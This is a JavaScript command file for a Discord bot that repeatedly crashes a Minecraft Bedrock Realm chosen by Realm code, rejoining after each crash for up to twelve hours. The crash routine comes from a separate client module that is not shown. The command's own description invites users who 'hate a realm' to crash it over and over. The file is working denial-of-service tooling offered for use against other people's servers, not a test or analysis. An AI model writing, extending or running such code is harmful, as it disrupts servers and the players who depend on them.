const { join } = require('../bedrockClient.js');

const crash = async function (realmCode, time, interaction, message, client, rejoinCount) {
    let messageData = { embeds:[
        {
            description: `${client.config.emojis.loading} Joining \`${realmCode}\`...`,
            footer: ({ text: `/crashloop | Command used by ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() }),
            color: 1286414
        } 
    ]}

    const reJoinPart = rejoinCount!==1 ? `\n<a:SpinningSkull:1152246877719367861> Crashed \`${rejoinCount}\` times!` : `\n<a:SpinningSkull:1152246877719367861> Crashed \`${rejoinCount}\` time!`
    
    if (rejoinCount>0) {
        messageData.embeds[0].description = `${client.config.emojis.loading} Rejoining \`${realmCode}\`...`+reJoinPart
        message.edit(messageData)
    } else {
        message.edit(messageData)
    }
    
    let connections = await join(realmCode, 1, async (data)=>{
        if (data.disconnect_reason=="close") {
            messageData.embeds[0].description = `${client.config.emojis.success} Crashed \`${realmCode}\`!`+reJoinPart
            messageData.embeds[0].color = 1286414
            if(Date.now() < time) {
                await crash(realmCode, time, interaction, message, client, rejoinCount+1);
                return;
            }
            message.edit(messageData);
            return;
        }
        messageData.embeds[0].description = `${client.config.emojis.leave} Disconnected from \`${realmCode}\`!\n\`\`\`${data.msg}\`\`\``+reJoinPart
        messageData.embeds[0].color = 16724787
        if (messageData.components) messageData.components[0].components[0].disabled = true
        message.edit(messageData);
    }).catch(e => {
        messageData.embeds[0].description = `${client.config.emojis.error} Failed to join \`${realmCode}\`!\n${e.msg}\nErrors:\n\`${e.errors.join('`\n`')}\``+reJoinPart
        messageData.embeds[0].color = 16724787
        message.edit(messageData);
    });
    if (!connections) return;

    messageData.embeds[0].description = `${client.config.emojis.join} Joined \`${realmCode}\`!`+reJoinPart
    message.edit(messageData);

    connections.crash();
    connections.mcClients.forEach(client => {
        console.log('Client: ' + client.username + ' is crashing the server!')
    });
    return true;
    
}

module.exports = {
	name: "crashloop",
    description: "Hate a realm so much you want to crash it? but not just once, but over and over again?",
    options:[
        {
            type: "STRING",
            name: "realmcode",
            description: "Realm Code To Crash",
            required: true,
            min_length: 11,
			max_length: 11
        },
        {
            type: "INTEGER",
            name: "time",
            description: "How long to crash the realm for (in minutes)",
            required: true,
            max_value: 3600*12,
            min_value: 0
        },
    ],
    level: 2,
	async execute(interaction, client) {
        const realmCode = interaction.options.getString('realmcode');
        const time = interaction.options.getInteger('time')*60000;
        messageData = { embeds:[
            {
                description: `${client.config.emojis.loading} Starting Crash loop...`,
                footer: ({ text: `/${this.name} | Command used by ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() }),
                color: 1286414
            } 
        ]}
        let message = await interaction.reply(messageData);

        crash(realmCode, time+Date.now(), interaction, message, client, 0);
    }
};